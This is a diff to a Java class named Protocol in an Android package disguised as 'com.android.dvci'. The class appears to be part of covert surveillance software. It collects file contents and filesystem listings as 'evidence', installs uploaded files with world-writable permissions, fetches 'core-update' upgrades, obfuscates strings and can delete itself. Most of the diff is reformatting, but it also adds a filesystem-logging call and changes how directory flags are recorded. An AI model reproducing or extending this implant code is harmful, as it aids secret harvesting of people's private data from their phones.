@@ -9,18 +9,6 @@
 
 package com.android.dvci.action.sync;
 
-import java.io.BufferedInputStream;
-import java.io.DataInputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.util.Arrays;
-import java.util.Date;
-import java.util.HashSet;
-import java.util.List;
-import java.util.Set;
-import java.util.Vector;
-
 import android.content.Intent;
 import android.net.Uri;
 
@@ -42,22 +30,38 @@ import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.util.Arrays;
+import java.util.Date;
+import java.util.HashSet;
+import java.util.Set;
+import java.util.Vector;
+
 /**
  * The Class Protocol, is extended by ZProtocol
  */
 public abstract class Protocol implements iProtocol {
 
-	/** The Constant UPGRADE_FILENAME. */
+	/**
+	 * The Constant UPGRADE_FILENAME.
+	 */
 	public static final String UPGRADE_FILENAME = M.e("core-update"); //$NON-NLS-1$
-	/** The debug. */
+	/**
+	 * The debug.
+	 */
 	private static final String TAG = "Protocol"; //$NON-NLS-1$
 	private static Object configLock = new Object();
-	/** The transport. */
+	/**
+	 * The transport.
+	 */
 	protected Transport transport;
 
 	Status status;
 
-	static Set<String> blackListDir = new HashSet<String>(Arrays.asList(new String[] { "/sys", "/dev", "/proc", "/acct" }));
+	static Set<String> blackListDir = new HashSet<String>(Arrays.asList(new String[]{"/sys", "/dev", "/proc", "/acct"}));
 
 	/** The reload. */
 	// public boolean reload;
@@ -67,9 +71,8 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Inits the.
-	 * 
-	 * @param transport
-	 *            the transport
+	 *
+	 * @param transport the transport
 	 * @return true, if successful
 	 */
 	public boolean init(final Transport transport) {
@@ -81,14 +84,11 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Save new conf.
-	 * 
-	 * @param conf
-	 *            the conf
-	 * @param offset
-	 *            the offset
+	 *
+	 * @param conf   the conf
+	 * @param offset the offset
 	 * @return true, if successful
-	 * @throws CommandException
-	 *             the command exception
+	 * @throws CommandException the command exception
 	 */
 	public static boolean saveNewConf(final byte[] conf, final int offset) throws CommandException {
 		boolean success = false;
@@ -112,11 +112,9 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Save upload.
-	 * 
-	 * @param filename
-	 *            the filename
-	 * @param content
-	 *            the content
+	 *
+	 * @param filename the filename
+	 * @param content  the content
 	 */
 	public static void saveUpload(final String filename, final byte[] content) {
 		final AutoFile file = new AutoFile(Path.uploads(), filename);
@@ -129,7 +127,7 @@ public abstract class Protocol implements iProtocol {
 
 		file.write(content);
 		file.chmod("777");
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " file written: " + file.exists());//$NON-NLS-1$
 		}
@@ -137,9 +135,8 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Upgrade multi.
-	 * 
-	 * @param files
-	 *            the files
+	 *
+	 * @param files the files
 	 * @return true, if successful
 	 */
 	public static boolean upgradeMulti(final Vector<String> files) {
@@ -206,7 +203,7 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Delete self.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	public static boolean deleteSelf() {
@@ -215,9 +212,8 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Save download log.
-	 * 
-	 * @param filefilter
-	 *            the filefilter
+	 *
+	 * @param filefilter the filefilter
 	 */
 	public static void saveDownloadLog(final String filefilter) {
 		File file = new File(filefilter);
@@ -250,10 +246,9 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Save file log.
-	 * 
-	 * @param !file the file
-	 * @param filename
-	 *            the filename
+	 *
+	 * @param !file    the file
+	 * @param filename the filename
 	 */
 	private static void saveFileLog(final File file, final String filename) {
 		if (Cfg.DEBUG) {
@@ -278,13 +273,13 @@ public abstract class Protocol implements iProtocol {
 		}
 		try {
 			int length = (int) file.length();
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveFileLog) %s length: %s", filename, length);
 			}
 			final byte[] additional = Protocol.logDownloadAdditional(filename);
 			EvidenceBuilder ev = new EvidenceBuilder(EvidenceType.DOWNLOAD, additional);
-			
+
 			DataInputStream is = new DataInputStream(new FileInputStream(file));
 			ev.write(is, length);
 
@@ -300,9 +295,8 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Log download additional.
-	 * 
-	 * @param filename
-	 *            the filename
+	 *
+	 * @param filename the filename
 	 * @return the byte[]
 	 */
 	private static byte[] logDownloadAdditional(String filename) {
@@ -344,11 +338,9 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Save filesystem.
-	 * 
-	 * @param depth
-	 *            the depth
-	 * @param path
-	 *            the path
+	 *
+	 * @param depth the depth
+	 * @param path  the path
 	 */
 	public static void saveFilesystem(final int depth, String path) {
 		EvidenceBuilder fsLog = new EvidenceBuilder(EvidenceType.FILESYSTEM);
@@ -367,6 +359,7 @@ public abstract class Protocol implements iProtocol {
 				path = path.substring(0, path.length() - 2);
 			}
 			if (path.startsWith("/")) {
+				Protocol.saveFilesystemLog(fsLog, path);
 				expandPath(fsLog, path, depth);
 			} else {
 				if (Cfg.DEBUG) {
@@ -380,11 +373,9 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
-	 * 
-	 * @param fsLog
-	 *            the fs log
-	 * @param depth
-	 *            the depth
+	 *
+	 * @param fsLog the fs log
+	 * @param depth the depth
 	 */
 	private static void expandRoot(final EvidenceBuilder fsLog, final int depth) {
 		if (Cfg.DEBUG) {
@@ -397,11 +388,9 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Save filesystem log.
-	 * 
-	 * @param fsLog
-	 *            the fs log
-	 * @param filepath
-	 *            the filepath
+	 *
+	 * @param fsLog    the fs log
+	 * @param filepath the filepath
 	 * @return true, if successful
 	 */
 	private static boolean saveFilesystemLog(final EvidenceBuilder fsLog, final String filepath) {
@@ -440,11 +429,14 @@ public abstract class Protocol implements iProtocol {
 
 		final boolean isDir = file.isDirectory();
 		if (isDir) {
-			flags |= 1;
-		} else {
-			if (size == 0) {
-				flags |= 2;
+			flags = 1;
+			String[] list = file.list();
+			if (list == null || list.length == 0) {
+				flags = 3;
 			}
+		} else {
+			flags = 2;
+
 		}
 
 		databuffer.writeInt(flags);
@@ -463,9 +455,8 @@ public abstract class Protocol implements iProtocol {
 	/**
 	 * saves the root log. We use this method because the directory "/" cannot
 	 * be opened, we fake it.
-	 * 
-	 * @param fsLog
-	 *            the fs log
+	 *
+	 * @param fsLog the fs log
 	 */
 	private static void saveRootLog(final EvidenceBuilder fsLog) {
 		final int version = 2010031501;
@@ -488,13 +479,10 @@ public abstract class Protocol implements iProtocol {
 	/**
 	 * Expand recursively the path saving the log. When depth is 0 saves the log
 	 * and stop recurring.
-	 * 
-	 * @param fsLog
-	 *            the fs log
-	 * @param path
-	 *            the path
-	 * @param depth
-	 *            the depth
+	 *
+	 * @param fsLog the fs log
+	 * @param path  the path
+	 * @param depth the depth
 	 */
 	private static void expandPath(final EvidenceBuilder fsLog, final String path, final int depth) {
 		if (Cfg.DEBUG) {
@@ -548,9 +536,8 @@ public abstract class Protocol implements iProtocol {
 
 	/**
 	 * Normalize filename.
-	 * 
-	 * @param file
-	 *            the file
+	 *
+	 * @param file the file
 	 * @return the string
 	 */
 	public static String normalizeFilename(final String file) {
